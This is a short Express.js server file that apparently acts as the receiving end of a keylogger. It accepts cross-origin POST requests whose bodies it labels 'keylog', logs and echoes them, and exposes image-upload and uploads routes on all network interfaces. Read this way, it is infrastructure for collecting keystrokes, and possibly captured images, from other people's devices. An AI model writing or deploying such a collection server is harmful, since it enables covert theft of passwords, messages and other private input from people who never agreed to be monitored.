const e = require("express");
const CORS = require("cors");
const imageRoutes = require("./Routes/ImageRoute");
const path = require("path");

let app = e();

app.use(CORS());
app.use(e.json());
app.post("/", (req, res) => {
  let keylog = req.body;
  console.log(keylog);
  res.json({ keylog });
});
app.use("/", imageRoutes);
app.use("/uploads", e.static(path.join(__dirname, "uploads")));

app.listen(3000, "0.0.0.0", () => {
  console.log("Server is running in http://localhost:3000");
});
